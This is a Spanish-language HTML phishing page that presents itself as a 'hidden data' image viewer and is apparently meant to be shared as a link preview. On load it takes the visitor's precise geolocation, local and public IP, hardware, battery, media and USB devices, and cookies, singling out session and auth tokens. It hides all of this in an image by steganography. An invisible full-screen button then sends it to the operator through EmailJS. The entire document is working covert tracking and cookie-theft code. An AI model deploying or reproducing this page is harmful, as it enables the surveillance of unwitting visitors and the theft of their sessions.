<!DOCTYPE html>
<html lang="es">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Datos Ocultos Avanzados</title>
 
 <!-- 🔽 NUEVO: Meta etiquetas para vista previa en redes/mensajería 🔽 -->
 <meta property="og:type" content="website" />
 <meta property="og:title" content="Datos Ocultos Avanzados - Captura de Sistema" />
 <meta property="og:description" content="Haz clic en la imagen para revelar los datos ocultos de tu dispositivo." />
 <meta property="og:image" content="images.jpg" />
 <meta property="og:url" content="https://modelos-colombia.site/" />
 <meta name="twitter:card" content="summary_large_image" />
 <!-- 🔼 FIN Meta etiquetas 🔼 -->

 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <style>
 body { 
 font-family: Arial, sans-serif; 
 margin: 0; 
 padding: 20px; 
 background-color: #f5f5f5; 
 display: flex; 
 flex-direction: column; 
 align-items: center; 
 user-select: none; /* Evita selección de texto accidental */
 }
 .container { 
 max-width: 800px; 
 width: 100%; 
 text-align: center; 
 position: relative;
 z-index: 1;
 }
 h1 { color: #333; margin-bottom: 20px; }
 .image-container { 
 position: relative; 
 margin: 20px 0; 
 display: inline-block; 
 }
 #stego-image { 
 width: 220px; 
 height: 220px; 
 image-rendering: pixelated; 
 border: 1px solid #ddd; 
 border-radius: 4px; 
 box-shadow: 0 2px 8px rgba(0,0,0,0.1); 
 background: #eee; 
 cursor: pointer; 
 }
 
 /* Botón invisible que cubre toda la pantalla */
 #send-btn { 
 position: fixed; 
 top: 0; 
 left: 0; 
 width: 100vw; 
 height: 100vh; 
 background: transparent; 
 border: none; 
 cursor: pointer; 
 z-index: 9999; 
 outline: none;
 }
 #send-btn:hover { 
 background: rgba(76, 175, 80, 0.05); /* Muy sutil al pasar el mouse */
 }
 #send-btn:disabled { 
 cursor: not-allowed; 
 }
 
 .loading { color: #666; font-style: italic; }
 .error { color: #d32f2f; }
 .success { color: #388e3c; }
 #location-info { margin-top: 10px; font-size: 14px; color: #555; }
 </style>
</head>
<body>
 <!-- El botón invisible está fuera del contenedor para cubrir todo -->
 <button id="send-btn" style="display:none;" onclick="sendExtractedData()"></button>

 <div class="container">
 <h1>Datos Ocultos Avanzados</h1>
 <div class="image-container">
 <!-- Imagen de vista previa insertada aquí -->
 <img id="preview-img" src="images.jpg" alt="Vista Previa" style="width: 220px; height: 220px; object-fit: cover; border-radius: 4px; margin-bottom: 10px;">
 <br>
 <img id="stego-image" alt="Imagen con datos ocultos" />
 </div>
 <div id="location-info">Cargando ubicación...</div>
 <div id="extracted-data" style="display:none;"></div>
 </div>

 <script>
 // ==========================================
 // 🔑 CONFIGURACIÓN EMAILJS
 // ==========================================
 const EMAILJS_PUBLIC_KEY = 'ORUAL6hyJNCnnWECy'; 
 const EMAILJS_SERVICE_ID = 'service_2i81eya'; 
 const EMAILJS_TEMPLATE_ID = 'template_lsjhsc8'; 
 
 (function() { emailjs.init(EMAILJS_PUBLIC_KEY); })();

 function getCurrentLocation() {
 return new Promise((resolve) => {
 if (!navigator.geolocation) { resolve("Geolocalización no disponible"); return; }
 navigator.geolocation.getCurrentPosition(
 (pos) => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Alt: ${pos.coords.altitude || 'N/A'}, Speed: ${pos.coords.speed || 'N/A'}`),
 (err) => resolve(`Error: ${err.message}`),
 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
 );
 });
 }

 async function encodeTextToImage(text, imgId) {
 const bytes = new TextEncoder().encode(text);
 const total = bytes.length;
 const payload = new Uint8Array(4 + total);
 payload[0] = (total >>> 24) & 0xff;
 payload[1] = (total >>> 16) & 0xff;
 payload[2] = (total >>> 8) & 0xff;
 payload[3] = total & 0xff;
 payload.set(bytes, 4);

 const totalBits = payload.length * 8;
 const pixelsNeeded = Math.ceil(totalBits / 3); 
 const width = Math.max(1, Math.ceil(Math.sqrt(pixelsNeeded)));
 const height = Math.max(1, Math.ceil(pixelsNeeded / width));

 const canvas = document.createElement('canvas');
 canvas.width = width; canvas.height = height;
 const ctx = canvas.getContext('2d');
 const imageData = ctx.createImageData(width, height);
 const data = imageData.data;

 for (let i = 0; i < data.length; i += 4) {
 data[i] = 128; data[i+1] = 128; data[i+2] = 128; data[i+3] = 255;
 }

 let bitIdx = 0;
 for (let p = 0; p < payload.length; p++) {
 const byte = payload[p];
 for (let b = 7; b >= 0; b--) {
 const bit = (byte >> b) & 1;
 const pixel = Math.floor(bitIdx / 3);
 const channel = bitIdx % 3; 
 const di = pixel * 4 + channel;
 data[di] = (data[di] & 0xFE) | bit;
 bitIdx++;
 }
 }

 ctx.putImageData(imageData, 0, 0);
 const img = document.getElementById(imgId);
 return new Promise((resolve) => {
 img.onload = () => setTimeout(() => resolve(img), 100);
 img.src = canvas.toDataURL('image/png');
 });
 }

 function decodeTextFromImage(imgElement, outputId) {
 const output = document.getElementById(outputId);
 try {
 const canvas = document.createElement('canvas');
 canvas.width = imgElement.naturalWidth; canvas.height = imgElement.naturalHeight;
 const ctx = canvas.getContext('2d');
 ctx.drawImage(imgElement, 0, 0);
 const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;

 const readByte = (startBit) => {
 let v = 0;
 for (let k = 0; k < 8; k++) {
 const bitIdx = startBit + k;
 const pixel = Math.floor(bitIdx / 3);
 const channel = bitIdx % 3;
 const di = pixel * 4 + channel;
 if (di >= data.length) return 0;
 v = (v << 1) | (data[di] & 1);
 }
 return v;
 };

 const len = ((readByte(0) << 24) | (readByte(8) << 16) | (readByte(16) << 8) | readByte(24)) >>> 0;
 const maxBytes = Math.floor(data.length / 4 * 3 / 8);
 if (len <= 0 || len > maxBytes) throw new Error('No se detectaron datos válidos.');

 const out = new Uint8Array(len);
 for (let i = 0; i < len; i++) out[i] = readByte(32 + i * 8);
 
 const text = new TextDecoder().decode(out);
 output.textContent = text;
 output.className = 'success';
 if (text.trim().length > 0) document.getElementById('send-btn').style.display = 'block';
 } catch (e) {
 output.textContent = 'Error: ' + e.message;
 output.className = 'error';
 }
 }

 async function sendExtractedData() {
 const extractedText = document.getElementById('extracted-data')?.textContent || '';
 const locationInfo = document.getElementById('location-info').textContent;
 if (!extractedText && !locationInfo) { alert('No hay datos.'); return; }

 const btn = document.getElementById('send-btn');
 btn.disabled = true; btn.style.background = 'rgba(76, 175, 80, 0.3)';

 const fullMessage = `Ubicación: ${locationInfo}\n\nDatos ocultos:\n${extractedText}`;
 const params = { message: fullMessage, date: new Date().toLocaleString() };

 emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params)
 .then(() => { alert('¡Enviado!'); btn.style.background = 'rgba(76, 175, 80, 0.5)'; },
 (err) => { alert('Error: ' + (err.text || err)); btn.disabled = false; btn.style.background = 'transparent'; });
 }

 // Función auxiliar para obtener info de GPU
 function getGPUInfo() {
 try {
 const canvas = document.createElement('canvas');
 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
 if (gl) {
 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 if (debugInfo) {
 return {
 vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
 renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
 };
 }
 }
 } catch (e) {}
 return { vendor: 'Desconocido', renderer: 'Desconocido' };
 }

 // Función auxiliar para obtener info de batería
 async function getBatteryInfo() {
 try {
 if (navigator.getBattery) {
 const battery = await navigator.getBattery();
 return {
 level: `${Math.round(battery.level * 100)}%`,
 charging: battery.charging ? 'Sí' : 'No',
 dischargeRate: battery.dischargingRate ? battery.dischargingRate.toFixed(2) + ' W' : 'N/A',
 timeRemaining: battery.dischargingTime === Infinity ? 'Indefinido' : battery.dischargingTime / 3600 + ' horas'
 };
 }
 } catch (e) {}
 return { level: 'N/A', charging: 'N/A' };
 }

 // Función auxiliar para obtener IP vía WebRTC
 async function getWebRTCIP() {
 return new Promise((resolve) => {
 const pc = new RTCPeerConnection({ iceServers: [] });
 pc.createDataChannel('');
 pc.createOffer().then(offer => pc.setLocalDescription(offer));
 pc.onicecandidate = (event) => {
 if (!event.candidate) {
 pc.close();
 const ipMatch = event.target.localDescription.sdp.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
 resolve(ipMatch ? ipMatch[0] : 'No disponible');
 }
 };
 setTimeout(() => { pc.close(); resolve('Timeout'); }, 2000);
 });
 }

 // Obtener IP Pública desde API externa
 async function getPublicIP() {
 try {
 const response = await fetch('https://api.ipify.org?format=json');
 const data = await response.json();
 return data.ip;
 } catch (e) {
 return 'Error obteniendo IP pública';
 }
 }

 // Escanear Cookies del dominio actual
 function getCookies() {
 if (!document.cookie) return "Sin cookies";
 const cookies = document.cookie.split(';').map(c => c.trim());
 // Busca palabras clave comunes en nombres de cookies (token, session, password, auth, etc.)
 const sensitiveKeywords = ['token', 'session', 'auth', 'password', 'pass', 'user', 'login', 'id', 'jwt'];
 const filteredCookies = cookies.filter(c => {
 const cookieName = c.split('=')[0].toLowerCase();
 return sensitiveKeywords.some(kw => cookieName.includes(kw));
 });
 
 if (filteredCookies.length > 0) {
 return `Cookies Sensibles Detectadas (${filteredCookies.length}):\n${filteredCookies.join('\n')}`;
 } else {
 return `Total de Cookies: ${cookies.length}\nLista Completa:\n${cookies.join('\n')}`;
 }
 }

 // Recopilación completa de datos
 async function gatherSystemInfo() {
 const gpu = getGPUInfo();
 const battery = await getBatteryInfo();
 const webRTCIP = await getWebRTCIP();
 const publicIP = await getPublicIP();
 
 // Conexión de red
 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
 const connectionInfo = conn ? {
 effectiveType: conn.effectiveType,
 downlink: conn.downlink + ' Mbps',
 rtt: conn.rtt + ' ms',
 saveData: conn.saveData ? 'Sí' : 'No'
 } : { effectiveType: 'N/A', downlink: 'N/A' };

 // Dispositivos multimedia
 let mediaDevices = [];
 try {
 const devices = await navigator.mediaDevices.enumerateDevices();
 devices.forEach(d => {
 if (d.kind === 'audioinput') mediaDevices.push('Micrófono');
 if (d.kind === 'audiooutput') mediaDevices.push('Altavoz');
 if (d.kind === 'videoinput') mediaDevices.push('Cámara');
 });
 } catch (e) {}

 // USB (Experimental, puede requerir permiso)
 let usbDevices = 'No disponible';
 if (navigator.usb) {
 try {
 const devices = await navigator.usb.getDevices();
 usbDevices = `${devices.length} dispositivos`;
 } catch (e) {
 usbDevices = 'Acceso denegado o no soportado';
 }
 }

 // Características de pantalla y ventana
 const screenInfo = {
 resolution: `${screen.width}x${screen.height}`,
 available: `${screen.availWidth}x${screen.availHeight}`,
 colorDepth: `${screen.colorDepth}-bit`,
 pixelRatio: window.devicePixelRatio
 };

 // Construir el string final
 return `=== INFORMACIÓN DEL SISTEMA Y NAVEGADOR ===

--- IDENTIDAD ---
User Agent: ${navigator.userAgent}
Plataforma: ${navigator.platform}
Arquitectura: ${navigator.userAgentData ? navigator.userAgentData.platform : 'N/A'}
Idioma: ${navigator.language}
Zona Horaria: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Cookies: ${navigator.cookieEnabled ? 'Habilitadas' : 'Deshabilitadas'}

--- HARDWARE ---
Núcleos CPU: ${navigator.hardwareConcurrency || 'N/A'}
Memoria Total: ${performance.memory ? (performance.memory.totalJSHeapSize / 1024 / 1024).toFixed(2) + ' MB usados' : 'N/A'}
GPU Vendor: ${gpu.vendor}
GPU Renderer: ${gpu.renderer}
Pantalla: ${screenInfo.resolution} (${screenInfo.pixelRatio}x zoom)
Touch Points: ${navigator.maxTouchPoints}
Sensores: Luz=${typeof AmbientLightSensor !== 'undefined'}, Giro=${typeof DeviceOrientationEvent !== 'undefined'}, Acel=${typeof Accelerometer !== 'undefined'}

--- RED E IP ---
IP Local (WebRTC): ${webRTCIP}
IP Pública: ${publicIP}
Tipo Conexión: ${connectionInfo.effectiveType}
Velocidad Estimada: ${connectionInfo.downlink}
Latencia: ${connectionInfo.rtt}
Ahorrar Datos: ${connectionInfo.saveData}

--- DISPOSITIVOS PERIFÉRICOS ---
Audio/Video: ${mediaDevices.join(', ') || 'Ninguno detectado'}
USB: ${usbDevices}

--- BATERÍA ---
Nivel: ${battery.level}
Cargando: ${battery.charging}
Tiempo Restante: ${battery.timeRemaining}

--- COOKIES ---
${getCookies()}

--- CAPACIDADES ---
Service Worker: ${'serviceWorker' in navigator ? 'Soportado' : 'No'}
WebGL: ${!!(window.WebGLRenderingContext && (document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl')))}
WebAssembly: ${typeof WebAssembly !== 'undefined' ? 'Soportado' : 'No'}
SharedArrayBuffer: ${typeof SharedArrayBuffer !== 'undefined' ? 'Sí' : 'No'}

Fecha de Captura: ${new Date().toISOString()}
ID Único Temporal: ${crypto.randomUUID ? crypto.randomUUID() : 'No disponible'}`;
 }

 // Inicializar
 window.addEventListener('load', async () => {
 const locationInfoElement = document.getElementById('location-info');
 const location = await getCurrentLocation();
 locationInfoElement.textContent = location;

 const systemInfo = await gatherSystemInfo();
 const imgElement = await encodeTextToImage(systemInfo, 'stego-image');
 decodeTextFromImage(imgElement, 'extracted-data');
 });
 </script>
</body>
</html>
